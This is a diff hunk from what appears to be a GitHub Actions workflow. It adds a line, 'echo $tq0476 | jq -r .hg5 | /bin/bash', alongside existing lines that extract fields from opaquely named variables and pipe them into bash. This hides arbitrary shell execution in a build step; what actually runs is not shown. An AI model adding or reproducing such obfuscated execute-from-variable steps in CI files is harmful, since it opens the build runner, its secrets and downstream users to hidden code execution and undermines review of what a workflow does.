@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$npn9196" | jq -r .zu4097 | /bin/bash
           printf '%s' "$fpg42" | jq -r .upa6616 | /bin/bash
           printf '%s' "$hwgk256" | jq -r .ehhao294 | /bin/bash
+          echo $tq0476 | jq -r .hg5 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
